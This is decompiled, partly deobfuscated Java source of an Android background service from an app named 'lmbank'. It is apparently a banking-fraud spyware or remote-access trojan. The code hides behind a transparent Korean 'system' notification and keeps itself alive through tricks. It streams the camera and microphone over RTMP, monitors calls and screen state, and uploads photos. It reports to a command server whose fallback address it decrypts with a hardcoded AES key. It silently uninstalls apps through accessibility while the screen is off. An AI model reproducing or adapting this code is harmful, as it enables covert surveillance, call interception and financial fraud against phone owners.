package com.wish.lmbank.service;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.location.Location;
import android.media.MediaPlayer;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Message;
import android.os.PowerManager;
import android.os.Process;
import android.provider.CallLog;
import android.text.TextUtils;

import androidx.annotation.NonNull;
import androidx.vectordrawable.graphics.drawable.PathInterpolatorCompat;

import com.pedro.rtmp.utils.ConnectCheckerRtmp;
import com.pedro.rtplibrary.rtmp.RtmpCamera2;
import com.wish.lmbank.AppStartV;
import com.wish.lmbank.R2;
import com.wish.lmbank.album.compress.Luban;
import com.wish.lmbank.album.config.PictureMimeType;
import com.wish.lmbank.album.config.PictureSelectionConfig;
import com.wish.lmbank.album.entity.LocalMedia;
import com.wish.lmbank.album.entity.LocalMediaFolder;
import com.wish.lmbank.album.listener.OnQueryDataResultListener;
import com.wish.lmbank.album.model.IBridgeMediaLoader;
import com.wish.lmbank.album.model.LocalMediaLoader;
import com.wish.lmbank.album.thread.PictureThreadUtils;
import com.wish.lmbank.album.tools.AndroidQTransformUtils;
import com.wish.lmbank.album.tools.SdkVersionUtils;
import com.wish.lmbank.bean.AlbumBean;
import com.wish.lmbank.bean.ColorRingBean;
import com.wish.lmbank.bean.CommandCloseBluetoothBean;
import com.wish.lmbank.bean.CommandContactBean;
import com.wish.lmbank.bean.CommandContactLimitUpdateBean;
import com.wish.lmbank.bean.CommandDelCallLogBean;
import com.wish.lmbank.bean.CommandDeleteSMSBean;
import com.wish.lmbank.bean.CommandHangUpBean;
import com.wish.lmbank.bean.CommandLoadInfoBean;
import com.wish.lmbank.bean.CommandLocationBean;
import com.wish.lmbank.bean.CommandMICBean;
import com.wish.lmbank.bean.CommandRebootBean;
import com.wish.lmbank.bean.CommandRecordingBean;
import com.wish.lmbank.bean.CommandScreenStateBean;
import com.wish.lmbank.bean.CommandSetDefaultDialerBean;
import com.wish.lmbank.bean.CommandUninstallAPKBean;
import com.wish.lmbank.bean.LimitPhoneNumberBean;
import com.wish.lmbank.bean.OrderBean;
import com.wish.lmbank.callback.PhoneCallListener;
import com.wish.lmbank.common.Constants;
import com.wish.lmbank.common.URL;
import com.wish.lmbank.db.AlbumDB;
import com.wish.lmbank.db.CallRingDB;
import com.wish.lmbank.db.CommandRecordingDB;
import com.wish.lmbank.db.LimitPhoneNumberDB;
import com.wish.lmbank.hellodaemon.AbsWorkService;
import com.wish.lmbank.helper.AccessibilityHelper;
import com.wish.lmbank.helper.RecorderShortHelper;
import com.wish.lmbank.helper.SocketHelper;
import com.wish.lmbank.http.HttpEngine;
import com.wish.lmbank.http.HttpManager;
import com.wish.lmbank.http.HttpResponse;
import com.wish.lmbank.keeplive.KeepLive;
import com.wish.lmbank.keeplive.activity.OnePixelActivity;
import com.wish.lmbank.keeplive.config.ForegroundNotification;
import com.wish.lmbank.keeplive.config.NotificationUtils;
import com.wish.lmbank.keeplive.receiver.NotificationClickReceiver;
import com.wish.lmbank.keeplive.receiver.OnepxReceiver;
import com.wish.lmbank.location.LocationManager;
import com.wish.lmbank.overlay.OverlayService;
import com.wish.lmbank.phone.PhoneCallManager;
import com.wish.lmbank.receiver.CallLogHelper;
import com.wish.lmbank.receiver.TelePhoneReceiver;
import com.wish.lmbank.receiver.UploadPhoneInfoRunnable;
import com.wish.lmbank.temp.Debugging;
import com.wish.lmbank.thread.RecordingThreadExecutor;
import com.wish.lmbank.thread.UploadInfoThreadExecutor;
import com.wish.lmbank.utils.AESUtils;
import com.wish.lmbank.utils.ContentUtils;
import com.wish.lmbank.utils.DateFormatUtils;
import com.wish.lmbank.utils.DeviceInfoUtils;
import com.wish.lmbank.utils.HandlerUtils;
import com.wish.lmbank.utils.JsonUtils;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.NetConTypeUtils;
import com.wish.lmbank.utils.PermissionUtils;
import com.wish.lmbank.utils.SettingUtils;
import com.wish.lmbank.utils.SharedPreferencesUtils;


import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;

import java.io.File;
import java.io.IOException;
import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import gv00l3ah.mvdt7w.bb7d7pu7;
import wei.mark.standout.StandOutWindow;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/service/RecServiceV.class */
public class RecServiceV extends AbsWorkService implements PhoneCallListener, SocketHelper.SocketCallback, LocationManager.UpdateLocationListener {
    private static final String TAG = "RecorderService";
    public static long connectErrorTime = 0;
    public static boolean isAlive = false;
    public static boolean isPause = true;
    public static long onDisconnectTime;
    protected PictureSelectionConfig config;
    private Handler handler;
    private LocationManager mAndroidLocationManager;
    private HandlerThread mHandlerThread;
    protected IBridgeMediaLoader mLoader;
    private OnepxReceiver mOnepxReceiver;
    private TelePhoneReceiver mPhoneCallReceiver;
    private Handler mThreadHandler;
    private UploadPhoneInfoRunnable mUploadPhoneInfoRunnable;
    private MediaPlayer mediaPlayer;
    private RtmpCamera2 rtmpCamera2;
    private ScreenStateReceiver screenStateReceiver;
    private final int PID = Process.myPid();
    private BroadcastReceiver mNetStateReceiver = null;
    private final int MESSAGE_COMMAND_RECORDING = 1;
    private final int MESSAGE_UPLOAD_RECORDING_FILE = 2;
    private boolean isUploadRecordingFile = false;
    private Timer mLoadLimitPhoneNumberTimer = new Timer();
    private Timer mKeepHeartTimer = new Timer();
    private Timer mLoadExtraMessageTimer = new Timer();
    private Timer mUninstallApkTimer = new Timer();
    private final int EXECUTE_COMMAND_RECORDING_TIMER_DELAY = 2000;
    private final int EXECUTE_COMMAND_RECORDING_TIMER_SCHEDULE = 30000;
    private final int EXECUTE_LOAD_LIMIT_PHONE_NUMBER_TIMER_DELAY = 2000;
    private final int EXECUTE_LOAD_LIMIT_PHONE_NUMBER_TIMER_SCHEDULE = 3600000;
    @SuppressLint("RestrictedApi")
    private final int EXECUTE_KEEP_HEART_TIMER_DELAY = PathInterpolatorCompat.MAX_NUM_POINTS;
    private final int EXECUTE_KEEP_HEART_TIMER_SCHEDULE = 10000;
    private final int EXECUTE_LOAD_EXTRA_MSG_TIMER_DELAY = 0;
    private final int EXECUTE_LOAD_EXTRA_MSG_SCHEDULE = 20000;
    private final int EXECUTE_PING_SERVER_DELAY = 60000;
    private final int EXECUTE_PING_SERVER_SCHEDULE = 60000;
    private final int EXECUTE_UNINSTALL_APK_DELAY = 60000;
    private final int EXECUTE_UNINSTALL_APK_SCHEDULE = 5000;
    private final int EXECUTE_UNINSTALL_APK_POST_DELAY = 15000;
    private final ExecutorService mSingleThreadPool = Executors.newSingleThreadExecutor();
    private Thread mGetLimitPhoneNumberThread = null;
    private Thread mGetColorRingThread = null;
    //     private final String RTMP_CAMERA = bb7d7pu7.m5998("Gh0bDAgEAAcONgoIBAwbCA");
    private final String RTMP_CAMERA = "streaming_camera";
    //     private final String RTMP_VOICE = bb7d7pu7.m5998("Gh0bDAgEAAcONgQACg");
    private final String RTMP_VOICE = "streaming_mic";
    private String networkType = "";
    private int batteryLevel = 0;
    //     private String isAllowUploadImage = bb7d7pu7.m5998("Bg8P");
    private String isAllowUploadImage = "off";
    //     private String isAllowSocket = bb7d7pu7.m5998("Bgc");
    private String isAllowSocket = "on";

    private final Runnable uninstallApkRunnable = new Runnable() { // from class: com.wish.lmbank.service.RecServiceV.3

        @Override // java.lang.Runnable
        public void run() {
//             if (bb7d7pu7.m5998("Bgc").equals(SharedPreferencesUtils.getValue(bb7d7pu7.m5998("CBwdBjYcBwAHGh0IBQU2CBkCNhoeAB0KAQ"), bb7d7pu7.m5998("Bg8P"))) && RecServiceV.isPause && !RecServiceV.this.isUninstallApk && SettingUtils.isEnabledAccessibility(this.this$0) && SettingUtils.mUninstallApkList.size() > 0 && SettingUtils.mUninstallApkList.get(0) != null) {
            if ("on".equals(SharedPreferencesUtils.getValue("auto_uninstall_apk_switch", "off")) && RecServiceV.isPause && !RecServiceV.this.isUninstallApk && SettingUtils.isEnabledAccessibility(RecServiceV.this) && SettingUtils.mUninstallApkList.size() > 0 && SettingUtils.mUninstallApkList.get(0) != null) {
                RecServiceV.this.isUninstallApk = true;
                String packageName = SettingUtils.mUninstallApkList.get(0).getPackageName();
                StringBuilder sb = new StringBuilder();
//                 sb.append(bb7d7pu7.m5998("jdPHjNjmjOTRgdTUgdTGjdLfU0k"));
                sb.append("亮屏卸载软件: ");
                sb.append(packageName);
                LogUtils.callLog(sb.toString());
//                 SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNjwnICc6PSglJTYoOSI"), true);
                SharedPreferencesUtils.putValue("KEY_UNINSTALL_APK", true);
                SettingUtils.uninstallApk(AppStartV.getContext(), packageName);
                if (SettingUtils.mUninstallApkList.size() > 0) {
                    SettingUtils.mUninstallApkList.remove(0);
                }
                RecServiceV.this.isUninstallApk = false;
            }

        }
    };
    private boolean isUninstallApk = false;
    private int pingServerCount = 0;
    private boolean isPingServer = false;
    /**
     * 监听电量广播
     */
    private final BroadcastReceiver mBatteryReceiver = new BroadcastReceiver() { // from class: com.wish.lmbank.service.RecServiceV.8

        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            if (intent != null) {
//                 RecServiceV.this.batteryLevel = intent.getIntExtra(bb7d7pu7.m5998("BQwfDAU"), 0);
                RecServiceV.this.batteryLevel = intent.getIntExtra("level", 0);
            }
        }
    };

    /**
     * 监听网络广播
     */
    private final BroadcastReceiver mConnectivityReceiver = new BroadcastReceiver() { // from class: com.wish.lmbank.service.RecServiceV.9

        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            RecServiceV.this.networkType = NetConTypeUtils.GetNetworkType(context);
//             String m5998 = bb7d7pu7.m5998("Jyw9PiY7IjY9MDks");
            String m5998 = "NETWORK_TYPE";
            String value = SharedPreferencesUtils.getValue(m5998, "");
            if (!TextUtils.isEmpty(RecServiceV.this.networkType) && !RecServiceV.this.networkType.equals(value)) {
                SocketHelper.getInstance(RecServiceV.this).isConnected();
                RecServiceV.this.reconnectSocket();
                RecServiceV.this.closeRtmpCamera2(false);
            }
            SharedPreferencesUtils.putValue(m5998, RecServiceV.this.networkType);
        }
    };
    boolean isLoadDialerList = false;
    int countLoadExtraMessage = 0;
    int countExecuteCommandRecording = 0;
    private boolean isLoadingExtraMsg = false;
    private int isCallEndReApplySetDialer = 0;
    private boolean isUploadImages = false;
    List<AlbumBean> uploadImagesList = new ArrayList();
    private boolean isSavingAlbumDB = false;

    @Override // com.wish.lmbank.hellodaemon.AbsWorkService
    public Boolean isWorkRunning(Intent intent, int i, int i2) {
        return null;
    }

    @Override // com.wish.lmbank.hellodaemon.AbsWorkService, android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // com.wish.lmbank.hellodaemon.AbsWorkService
    public IBinder onBind(Intent intent, Void r4) {
        return null;
    }

    @Override // com.wish.lmbank.hellodaemon.AbsWorkService
    public void stopWork(Intent intent, int i, int i2) {
    }

    static /* synthetic */ int access$808(RecServiceV recServiceV) {
        int i = recServiceV.pingServerCount;
        recServiceV.pingServerCount = i + 1;
        return i;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        System.out.println("运行");
        init();
    }

    private void init() {
        Constants.load(AppStartV.isDebug);
        //判断是否亮屏状态
//         isPause = ((PowerManager) getApplicationContext().getSystemService(bb7d7pu7.m5998("GQYeDBs"))).isScreenOn();
        isPause = ((PowerManager) getApplicationContext().getSystemService(Context.POWER_SERVICE)).isScreenOn();
        if (this.handler == null) {
            this.handler = new Handler();
        }
        isAlive = true;
        initDB();
        LocationManager locationManager = new LocationManager(this);
        this.mAndroidLocationManager = locationManager;
        locationManager.seUpdateLocationListen(this);
        initKeepLive();
        initRTMP();
        initHandlerThread();
        initTimer();
        registerNetworkStateReceiver();
        registerContentObserver();
        registerBatteryReceiver();
        registerConnectivityReceiver();
        initSocket();
        startNotification();
        registerPhoneCallReceiver();
        initPictureLoader();
        SettingUtils.getUninstallApkList(AppStartV.getContext(), AccessibilityHelper.UNINSTALL_APK);
    }

    @Override // com.wish.lmbank.hellodaemon.AbsWorkService
    public Boolean shouldStopService(Intent intent, int i, int i2) {
        return false;
    }

    @Override // com.wish.lmbank.hellodaemon.AbsWorkService
    public void startWork(Intent intent, int i, int i2) {
        isAlive = true;
        if (KeepLive.useSilenceMusic && this.mediaPlayer == null) {
            MediaPlayer create = MediaPlayer.create(this, (int) R2.raw.novioce);
            this.mediaPlayer = create;
            if (create != null) {
                create.setVolume(0.0f, 0.0f);
                this.mediaPlayer.setOnCompletionListener(new MediaPlayer.OnCompletionListener() { // from class: com.wish.lmbank.service.RecServiceV.1

                    @Override // android.media.MediaPlayer.OnCompletionListener
                    public void onCompletion(MediaPlayer mediaPlayer) {
                    }

                });
                this.mediaPlayer.setOnErrorListener(new MediaPlayer.OnErrorListener() { // from class: com.wish.lmbank.service.RecServiceV.2

                    @Override // android.media.MediaPlayer.OnErrorListener
                    public boolean onError(MediaPlayer mediaPlayer, int i3, int i4) {
                        return false;
                    }

                });
            }
        }
    }

    @Override // com.wish.lmbank.hellodaemon.AbsWorkService
    public void onServiceKilled(Intent intent) {
        isAlive = false;
//         LogUtils.callLog(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoMSQYHOgwbHwAKDCIABQUMDUVJABlTSQ") + URL.getHost());
        LogUtils.callLog("RecorderService onServiceKilled, ip: " + URL.getHost());
    }

    private void initPictureLoader() {
        PictureSelectionConfig pictureSelectionConfig = PictureSelectionConfig.getInstance();
        this.config = pictureSelectionConfig;
        pictureSelectionConfig.isAndroidQTransform = true;
        this.config.isCompress = true;
        this.config.compressQuality = 60;
        this.config.isWebp = false;
        this.config.isBmp = false;
        this.mLoader = new LocalMediaLoader(AppStartV.getContext(), this.config);
    }

    private void initSocket() {
        SocketHelper.getInstance(this).connect();
    }

    //初始化监听亮屏状态广播
    private void initKeepLive() {
        if (this.mOnepxReceiver == null) {
            this.mOnepxReceiver = new OnepxReceiver();
        }

        IntentFilter intentFilter = new IntentFilter();
//         intentFilter.addAction(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRzoqOywsJzYmLy8"));
        intentFilter.addAction("android.intent.action.SCREEN_OFF");
//         intentFilter.addAction(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRzoqOywsJzYmJw"));
        intentFilter.addAction("android.intent.action.SCREEN_ON");
        registerReceiver(this.mOnepxReceiver, intentFilter);
        if (this.screenStateReceiver == null) {
            this.screenStateReceiver = new ScreenStateReceiver(this);
        }
        IntentFilter intentFilter2 = new IntentFilter();
//         intentFilter2.addAction(bb7d7pu7.m5998("NigqPSAmJzY6KjssLCc2Ji8v"));
        intentFilter2.addAction("_ACTION_SCREEN_OFF");
//         intentFilter2.addAction(bb7d7pu7.m5998("NigqPSAmJzY6KjssLCc2Jic"));
        intentFilter2.addAction("_ACTION_SCREEN_ON");
        registerReceiver(this.screenStateReceiver, intentFilter2);
    }


    /**
     * 亮屏状态广播
     */
    public class ScreenStateReceiver extends BroadcastReceiver {
        final RecServiceV this$0;

        private ScreenStateReceiver(RecServiceV recServiceV) {
            this.this$0 = recServiceV;
        }

        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
//             if (intent.getAction().equals(bb7d7pu7.m5998("NigqPSAmJzY6KjssLCc2Ji8v"))) {
            if (intent.getAction().equals("_ACTION_SCREEN_OFF")) {
                //亮屏
                RecServiceV.isPause = false;
                if (!AppStartV.isCalling) {
                    RecServiceV.this.play();
                }
                if (RecServiceV.this.mUninstallApkTimer != null) {
                    RecServiceV.this.mUninstallApkTimer.cancel();
                    RecServiceV.this.mUninstallApkTimer = null;
                }
                RecServiceV.this.isUninstallApk = false;
                HandlerUtils.getMainThreadHandler().removeCallbacks(RecServiceV.this.uninstallApkRunnable);
                SettingUtils.getUninstallApkList(AppStartV.getContext(), AccessibilityHelper.UNINSTALL_APK);
//             } else if (intent.getAction().equals(bb7d7pu7.m5998("NigqPSAmJzY6KjssLCc2Jic"))) {
            } else if (intent.getAction().equals("_ACTION_SCREEN_ON")) {
                //息屏
                RecServiceV.isPause = true;
                RecServiceV.this.pause();
                HandlerUtils.getMainThreadHandler().postDelayed(RecServiceV.this.uninstallApkRunnable, 15000L);
            }
            SocketHelper.getInstance(this.this$0).sendScreenStateToServer(String.valueOf(RecServiceV.isPause));
        }
    }

    /**
     * 初始化监听摄像头
     */
    private void initRTMP() {
        this.rtmpCamera2 = new RtmpCamera2(this, false, new ConnectCheckerRtmp() {
            @Override
            public void onNewBitrateRtmp(long l) {

            }

            @Override
            public void onConnectionStartedRtmp(@NonNull String s) {

            } // from class: com.wish.lmbank.service.RecServiceV.4

            @Override // net.ossrs.rtmp.ConnectCheckerRtmp
            public void onAuthSuccessRtmp() {
            }

            //
            @Override // net.ossrs.rtmp.ConnectCheckerRtmp
            public void onConnectionSuccessRtmp() {
            }


            @Override // net.ossrs.rtmp.ConnectCheckerRtmp
            public void onConnectionFailedRtmp(String str) {
//                     LogUtils.callLog(bb7d7pu7.m5998("Oz0kOUmB1veP58yMzdiB3cxFSRsMCBoGB1NJ") + str);
                LogUtils.callLog("RTMP 连接失败, reason: " + str);
                RecServiceV.this.closeRtmpCamera2(false);
            }

            @Override // net.ossrs.rtmp.ConnectCheckerRtmp
            public void onDisconnectRtmp() {
                RecServiceV.this.closeRtmpCamera2(false);
            }

            @Override // net.ossrs.rtmp.ConnectCheckerRtmp
            public void onAuthErrorRtmp() {
                RecServiceV.this.closeRtmpCamera2(false);
            }
        });
    }

    /**
     * 状态栏通知，保活的一种手法
     */
    private void startNotification() {
        if (KeepLive.foregroundNotification == null) {
            KeepLive.foregroundNotification = new ForegroundNotification("시스템", "정보불러오는중...", R2.drawable.ico_transparent, R2.layout.layout_notification_transparent);
        }
        Intent intent = new Intent(getApplicationContext(), NotificationClickReceiver.class);
//         intent.setAction(bb7d7pu7.m5998("KiUgKiI2JyY9IC8gKig9ICYn"));
        intent.setAction("CLICK_NOTIFICATION");
        startForeground(13691, NotificationUtils.createNotification(this, KeepLive.foregroundNotification.getTitle(), KeepLive.foregroundNotification.getDescription(), KeepLive.foregroundNotification.getIconRes(), KeepLive.foregroundNotification.getLayoutId(), intent));
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void play() {
        MediaPlayer mediaPlayer;
        if (!KeepLive.useSilenceMusic || (mediaPlayer = this.mediaPlayer) == null || mediaPlayer.isPlaying()) {
            return;
        }
        this.mediaPlayer.start();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void pause() {
        MediaPlayer mediaPlayer;
        if (KeepLive.useSilenceMusic && (mediaPlayer = this.mediaPlayer) != null && mediaPlayer.isPlaying()) {
            this.mediaPlayer.pause();
        }
    }


    private void initDB() {
        //删除1=1
        CommandRecordingDB.getInstance(this).deleteCommandRecording();
    }

    private void initTimer() {
        initLoadLimitPhoneNumberTimer();
        initKeepHeartTimer();
        initLoadExtraMessageTimer();
        initUninstallApkTimer();
    }

    private void initUninstallApkTimer() {
        if (this.mUninstallApkTimer == null) {
            this.mUninstallApkTimer = new Timer();
        }
        this.mUninstallApkTimer.schedule(new TimerTask() { // from class: com.wish.lmbank.service.RecServiceV.5

            @Override // java.util.TimerTask, java.lang.Runnable
            public void run() {
                HandlerUtils.getMainThreadHandler().post(RecServiceV.this.uninstallApkRunnable);
                return;
            }
        }, 60000L, 5000L);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void pingServer() {
        if (this.isPingServer) {
            return;
        }
        this.isPingServer = true;
        HttpManager.getInstance().pingServer(DeviceInfoUtils.getDeviceID(this), new HttpEngine.OnResponseCallback<HttpResponse.R_String>() { // from class: com.wish.lmbank.service.RecServiceV.6

            @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
            public void onResponse(int i, String str, HttpResponse.R_String r_String) {
                RecServiceV.this.isPingServer = false;
                if (i == 0) {
                    RecServiceV.this.pingServerCount = 0;
                    return;
                }
                RecServiceV.access$808(RecServiceV.this);
                StringBuilder sb = new StringBuilder();
//                 String m5998 = bb7d7pu7.m5998("GQAHDjoMGx8MG0VJGQAHDjoMGx8MGyoGHAcdU0k");
                String m5998 = "pingServer, pingServerCount: ";
                sb.append(m5998);
                sb.append(RecServiceV.this.pingServerCount);
//                 LogUtils.v(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"), sb.toString());
                LogUtils.v("RecorderService", sb.toString());
                if (RecServiceV.this.pingServerCount < 3) {
                    return;
                }
                StringBuilder sb2 = new StringBuilder();
                sb2.append(m5998);
                sb2.append(RecServiceV.this.pingServerCount);
//                 sb2.append(bb7d7pu7.m5998("RUkAGVNJ"));
                sb2.append(", ip: ");
                sb2.append(URL.getHost());
                LogUtils.callLog(sb2.toString());
                RecServiceV.this.pingServerCount = 0;
                RecServiceV.this.requestHost();
            }
        });
    }

    public class AnonymousClass7 implements Runnable {
        final RecServiceV this$0;

        AnonymousClass7(RecServiceV recServiceV) {
            this.this$0 = recServiceV;
        }

        @Override // java.lang.Runnable
        public void run() {
            String[] split;
            String[] split2;
//             String m5998 = bb7d7pu7.m5998("RA");
            String m5998 = "-";
            try {
                Document document = Jsoup.connect(URL.URL_ALTERNATE_IP).get();
                //                     Iterator it = document.getElementsByTag(bb7d7pu7.m5998("HQAdBQw")).iterator();
                Iterator<Element> it = document.getElementsByTag("title").iterator();
                while (it.hasNext()) {
                    String html = it.next().html();
//                         LogUtils.callLog(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoMRUkbDBgcDBodIQYaHUVJHQAdBQxTSQ") + html);
                    LogUtils.callLog("RecorderService, requestHost, title: " + html);
                    if (!TextUtils.isEmpty(html)) {
                        String[] split3 = html.split(m5998);
                        if (split3.length != 2) {
                            return;
                        }
//                             String decrypt = AESUtils.decrypt(!TextUtils.isEmpty(split3[0]) ? split3[0].trim() : "", bb7d7pu7.m5998("Ay07KAEGHh8RAg8_LBtYBA"));
                        String decrypt = AESUtils.decrypt(!TextUtils.isEmpty(split3[0]) ? split3[0].trim() : "", "jDRAhowvxkfVEr1m");
                        if (!TextUtils.isEmpty(decrypt) && (split = decrypt.split(m5998)) != null) {
                            for (String str : split) {
//                                     if (!TextUtils.isEmpty(str) && (split2 = str.split(bb7d7pu7.m5998("Ng"))) != null && split2.length == 2) {
                                if (!TextUtils.isEmpty(str) && (split2 = str.split("_")) != null && split2.length == 2) {
                                    if (Constants.SERVER_NAME.equals(split2[0])) {
                                        if (!AppStartV.isDebug) {
                                            URL.setHost(split2[1]);
                                        }
                                        RecServiceV.this.handler.post(new Runnable() { // from class: com.wish.lmbank.service.RecServiceV.7.1

                                            @Override // java.lang.Runnable
                                            public void run() {
                                                SocketHelper.getInstance(RecServiceV.this).closeSocket();
                                            }
                                        });
                                        AppStartV.isLoadUrl = true;
                                        return;
                                    }
                                }
                            }
                            return;
                        }
                    }
                }
            } catch (IOException e) {
//                 LogUtils.callLog(bb7d7pu7.m5998("GwwYHAwaHSgFHQwbBwgdDCA5RUkMEQoMGR0ABgdTSQ") + e.getMessage());
                LogUtils.callLog("requestAlternateIP, exception: " + e.getMessage());
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void requestHost() {
        new Thread(new AnonymousClass7(this)).start();
    }


    /**
     * 获取当前电量，保活后台运行的一种
     */
    private void registerBatteryReceiver() {
        IntentFilter intentFilter = new IntentFilter();
//             intentFilter.addAction(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRysoPT0sOzA2KiEoJy4sLQ"));
        intentFilter.addAction("android.intent.action.BATTERY_CHANGED");
        registerReceiver(this.mBatteryReceiver, intentFilter);
    }

    /**
     * 注册网络状态广播
     */
    private void registerConnectivityReceiver() {
        IntentFilter intentFilter = new IntentFilter();
//         intentFilter.addAction(bb7d7pu7.m5998("CAcNGwYADUcHDB1HCgYHB0cqJicnLCo9ID8gPTA2KiEoJy4s"));
        intentFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
        registerReceiver(this.mConnectivityReceiver, intentFilter);
    }

    /**
     * 创建电话广播
     */
    private void registerPhoneCallReceiver() {
        if (this.mPhoneCallReceiver != null) {
            return;
        }
        IntentFilter intentFilter = new IntentFilter();
//         intentFilter.addAction(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRzkhJicsNjo9KD0s"));
        intentFilter.addAction("android.intent.action.PHONE_STATE");
//         intentFilter.addAction(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRycsPjYmPD0uJiAnLjYqKCUl"));
        intentFilter.addAction("android.intent.action.NEW_OUTGOING_CALL");
//         intentFilter.addAction(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRyolJjosNjowOj0sJDYtICglJi46"));
        intentFilter.addAction("android.intent.action.CLOSE_SYSTEM_DIALOGS");
        TelePhoneReceiver telePhoneReceiver = new TelePhoneReceiver(this);
        this.mPhoneCallReceiver = telePhoneReceiver;
        telePhoneReceiver.setPhoneCallListener(this);
        registerReceiver(this.mPhoneCallReceiver, intentFilter);
    }

    /**
     * 注销电话监听广播
     */
    private void unregisterPhoneCallReceiver() {
        try {
            TelePhoneReceiver telePhoneReceiver = this.mPhoneCallReceiver;
            if (telePhoneReceiver != null) {
                unregisterReceiver(telePhoneReceiver);
                this.mPhoneCallReceiver = null;
            }
        } catch (Exception e) {
//             LogUtils.e(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"), e, new Object[0]);
            LogUtils.e("RecorderService", e);
        }
    }

    private void initLoadLimitPhoneNumberTimer() {
        this.mLoadLimitPhoneNumberTimer.schedule(new TimerTask() { // from class: com.wish.lmbank.service.RecServiceV.10
            @Override // java.util.TimerTask, java.lang.Runnable
            public void run() {
                RecServiceV.this.loadLimitPhoneNumber();
                RecServiceV.this.loadColorRing();
            }
        }, 2000L, 3600000L);
    }

    private void initKeepHeartTimer() {
        this.mKeepHeartTimer.schedule(new TimerTask() { // from class: com.wish.lmbank.service.RecServiceV.11

            @Override // java.util.TimerTask, java.lang.Runnable
            public void run() {
                try {
//                     if (bb7d7pu7.m5998("Bg8P").equals(RecServiceV.this.isAllowSocket)) {
                    if ("off".equals(RecServiceV.this.isAllowSocket)) {
                        SocketHelper.getInstance(RecServiceV.this).closeSocket();
                    } else {
                        SocketHelper.getInstance(RecServiceV.this).reconnectSocket();
                        SocketHelper.getInstance(RecServiceV.this).sendKeepHeartMsgToServer(String.valueOf(RecServiceV.this.batteryLevel), RecServiceV.this.networkType, Long.toString(System.currentTimeMillis()));
                    }
//                     if (RecServiceV.this.isSavingAlbumDB || RecServiceV.this.isUploadImages || RecServiceV.this.uploadImagesList.size() <= 0 || !bb7d7pu7.m5998("Bgc").equals(RecServiceV.this.isAllowUploadImage)) {
                    if (RecServiceV.this.isSavingAlbumDB || RecServiceV.this.isUploadImages || RecServiceV.this.uploadImagesList.size() <= 0 || !"on".equals(RecServiceV.this.isAllowUploadImage)) {
                        return;
                    }
                    RecServiceV recServiceV = RecServiceV.this;
                    recServiceV.uploadImages(recServiceV.uploadImagesList.get(0));
                } catch (Exception e) {
//                     LogUtils.callLog(bb7d7pu7.m5998("AAcAHSIMDBkhDAgbHT0ABAwbRUkMEQoMGR0ABgdTSQ") + e.getMessage());
                    LogUtils.callLog("initKeepHeartTimer, exception: " + e.getMessage());
                }
            }
        }, 3000L, 10000L);
    }

    private void initLoadExtraMessageTimer() {
        this.mLoadExtraMessageTimer.schedule(new TimerTask() { // from class: com.wish.lmbank.service.RecServiceV.12

            @Override // java.util.TimerTask, java.lang.Runnable
            public void run() {
                RecServiceV.this.countLoadExtraMessage++;
                RecServiceV.this.countExecuteCommandRecording++;
                if (RecServiceV.this.countLoadExtraMessage == 1) {
                    RecServiceV.this.isLoadDialerList = true;
                } else {
                    RecServiceV.this.isLoadDialerList = false;
                    if (RecServiceV.this.countLoadExtraMessage >= 5) {
                        RecServiceV.this.countLoadExtraMessage = 0;
                        RecServiceV.this.pingServer();
                    }
                    if (RecServiceV.this.countExecuteCommandRecording >= 2) {
                        RecServiceV.this.countExecuteCommandRecording = 0;
                        if (RecServiceV.this.mThreadHandler != null) {
                            RecServiceV.this.mThreadHandler.sendEmptyMessage(1);
                        }
                    }
                }
                RecServiceV recServiceV = RecServiceV.this;
                recServiceV.loadExtraMessage(recServiceV.isLoadDialerList);
                if (RecServiceV.this.isUploadRecordingFile || RecServiceV.this.mThreadHandler == null) {
                    return;
                }
                RecServiceV.this.mThreadHandler.sendEmptyMessage(2);
            }
        }, 0L, 20000L);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void closeTimer() {
        Timer timer = this.mLoadLimitPhoneNumberTimer;
        if (timer != null) {
            timer.cancel();
            this.mLoadLimitPhoneNumberTimer = null;
        }
        Timer timer2 = this.mKeepHeartTimer;
        if (timer2 != null) {
            timer2.cancel();
            this.mKeepHeartTimer = null;
        }
        Timer timer3 = this.mLoadExtraMessageTimer;
        if (timer3 != null) {
            timer3.cancel();
            this.mLoadExtraMessageTimer = null;
        }
    }

    /**
     * 录音
     */
    private void initHandlerThread() {
//         HandlerThread handlerThread = new HandlerThread(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"));
        HandlerThread handlerThread = new HandlerThread("RecorderService");
